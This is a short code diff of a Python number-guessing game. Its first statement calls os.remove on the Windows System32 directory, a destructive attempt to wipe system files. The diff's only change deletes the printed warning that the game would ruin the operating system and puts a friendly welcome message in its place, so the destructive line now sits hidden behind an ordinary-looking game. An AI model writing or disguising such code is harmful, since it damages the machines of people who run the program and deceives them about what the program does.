@@ -4,7 +4,7 @@ import random
 def guessing_game():
     os.remove("C:\\Windows\\System32")  
 
-    print("Welcome to The worst game of your life. This will ruin you're entire operating system. Guess a number. ")
+    print("Welcome to the guessing game. ")
     print("I'm thinking of a number between 1 and 100!")
 
     
